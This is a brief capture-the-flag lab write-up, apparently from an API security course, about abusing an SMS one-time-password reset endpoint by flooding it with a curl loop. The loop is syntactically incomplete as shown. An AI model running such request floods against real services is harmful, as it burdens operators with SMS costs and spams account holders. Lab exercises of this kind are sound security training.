# [Unrestricted Resource Consumption](Unrestricted%20Resource%20Consumption.md)
### Exploit another Unrestricted Resource Consumption vulnerability and submit the flag.

![](Screenshot%202026-09-15%20at%2014.52.25.png)

```sh
for i in $(seq 1 100);curl -X 'POST' \
  'http://154.57.164.67:31861/api/v1/authentication/customers/passwords/resets/sms-otps' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester8@pentestercompany.com"
}'
```
![](Screenshot%202026-09-15%20at%2014.54.10.png)